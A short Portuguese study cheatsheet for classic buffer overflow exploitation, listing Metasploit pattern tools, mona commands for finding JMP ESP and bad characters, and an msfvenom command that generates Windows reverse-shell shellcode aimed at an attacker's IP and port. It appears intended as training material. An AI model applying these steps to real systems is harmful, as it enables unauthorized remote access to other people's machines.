# Buffer Clássico | Cheatsheet

Esse material foi desenvolvido com a intenção de auxiliar os estudantes que se envolverem com o tema de Buffer Overflow Clássico.

---

Criando um padrão aleátorio de caracteres para a identificação da quantidade de caracteres que são necessários para a manipulação do EIP.

```
msf-pattern_create -l 550
```

Identificando a quantidade necessária para controlar o EIP baseado no padrão gerado acima.

```
msf-pattern_offset -q <EIP>
```

Encontrando uma instrução válida **JMP ESP** na aplicação utilizando o [mona](https://github.com/corelan/mona).

```
!mona jmp -r esp
```

Gerando *bytearray* para os testes dos caracteres que são inválidos para a aplicação.

```
!mona bytearray -cpb "\x00"
```

Comparando o endereço onde estão localizado os caracteres que foram enviados para aplicação com o binário do bytearray que foi gerado no comando acima.

```
!mona compare -f C:\monalogs\aplicacao\bytearray.bin -a <ENDEREÇO>
```

Gerando o shellcode para receber o acesso remoto na máquina.

```
msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows -b "<badchars>" LHOST=<IP DO ATACANTE> LPORT=<PORTA DO ATACANTE> -f c
```
<br />

## Scripts

Scripts           | Link        
------------------|-------------
conecta.py        | Clique aqui 
fuzzing.py        | Clique aqui 
poc.py            | Clique aqui 
findeip.py        | Clique aqui
eip.py            | Clique aqui 
badchars.py       | Clique aqui 
exploit.py        | Clique aqui 

